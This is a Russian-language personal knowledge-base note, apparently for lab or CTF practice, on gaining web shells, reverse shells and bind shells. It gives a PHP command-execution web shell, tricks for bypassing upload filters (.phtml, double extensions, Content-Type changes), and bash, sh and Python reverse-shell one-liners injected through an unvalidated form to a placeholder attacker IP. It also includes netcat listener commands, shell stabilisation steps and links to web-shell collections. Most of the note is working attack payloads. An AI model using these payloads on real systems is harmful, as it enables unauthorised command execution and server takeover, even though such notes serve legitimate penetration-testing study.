---
title: "ШЕЛЛ (reverse shell, bind shell)"
id: note-06
created: "28.11.2025 17:04"
category: "09_Эксплуатация и оболочки"
tags:
  - иб/эксплуатация
  - shells
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `09_Эксплуатация и оболочки` · Дата: `28.11.2025 17:04`

# ШЕЛЛ (reverse shell, bind shell)

ШЕЛЛ (reverse shell, bind shell) 

Загрузка файлового шелла (Web Shell)

Примеры  улучшеного  веб  шела:
p0wny-shell — минималистичная однофайловая веб-оболочка на PHP , позволяющая удаленно выполнять команды.
https://github.com/flozz/p0wny-shell
b374k shell — более функциональная веб-оболочка PHP с возможностью управления файлами и выполнения команд, а также другими возможностями.
https://github.com/b374k/b374k
c99 shell — известная и надёжная PHP -оболочка с широкими функциональными возможностями.
https://www.r57shell.net/single.php?id=13
Больше оболочек будет тут 
https://www.r57shell.net/index.php


Цель: Получить возможность выполнять произвольные команды на сервере через HTTP.

Можно использовать php-шел  если сервис на php 
Пример :  <?php system($_GET['cmd']); ?>
Если есть защита  то можно  обойти ее  можно попробовать  .phtml, изменение Content-Type в Burp Suite, двойные расширения.
После надо  определите путь к загруженному файлу.
После загрузки сервер может показать путь.
Стандартные директории: /uploads/, /images/, /assets/.
Посмотрите исходный код страницы (Ctrl+U).
Тестирование: 
http://<IP_МАШИНЫ>:<PORT_СЕРВИСА_1>/uploads/cmd.php?cmd=whoami
Если видно имя пользователя (например, www-data) — первый этап пройден.


Переход к Reverse Shell / Bind Shell
Reverse Shell (Обратный шелл) — Золотой стандарт.
Суть: Вы заставляете целевую машину (жертву) подключиться к вашей машине (атакующему).
Bind Shell (Прямой шелл)
Суть: Вы открываете на целевой машине порт, который начинает "слушать" входящие соединения и отдавать шелл.

Пример установки шелла:
Запустить слушатель для обратного шелла на СВОЕЙ машине:
nc -lnvp 4444
Через загрузку файла :
Создай файл shell.php на своем компьютере:
<?php system($_GET['cmd']); ?>
использование:
http://10.10.Х.Х:3000/uploads/shell.php?cmd=whoami

Через невалидируемую форму:
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' ;
если нету bash то можно использовать sh 
; sh -i >& /dev/tcp/YOUR_IP/4444 0>&1 ; 
Через  Python
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' ;
Если все ок 
Connection from 10.10.X.X received!
www-data@machine-name:/var/www/html$
Стабилизируй шелл (чтобы можно было нажимать Ctrl+C, использовать стрелки):
bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Нажми Ctrl+Z
# В СВОЕМ терминале (не в шелле!) напиши:
stty raw -echo; fg
# Дважды нажми Enter

Пример использования 

Скачать следующий обратный PHP-шелл
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php .

Отредактируйте файл php-reverse-shell.php и измените IP-адрес на ваш IP-адрес tun0.

Переименуйте этот файл в php-reverse-shell.phtml.
Теперь мы будем прослушивать входящие соединения с помощью netcat.

 Выполните следующую команду: nc -lvnp 1234.
Загрузите вашу оболочку и перейдите по адресу  http://MACHINE_IP:3333/internal/uploads/php-reverse-shell.phtml - Это приведет к выполнению вашей полезной нагрузки.

## Ссылки

- [php-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- [c99 Shell](https://www.r57shell.net/single.php?id=13)
- [GitHub - b374k/b374k: PHP Webshell with handy features](https://github.com/b374k/b374k)
- [R57 Shell | C99 Shell | Shell | TXT Shell | R57.php | c99.php | r57shell.net](https://www.r57shell.net/index.php)
- [GitHub - flozz/p0wny-shell: Single-file PHP shell](https://github.com/flozz/p0wny-shell)
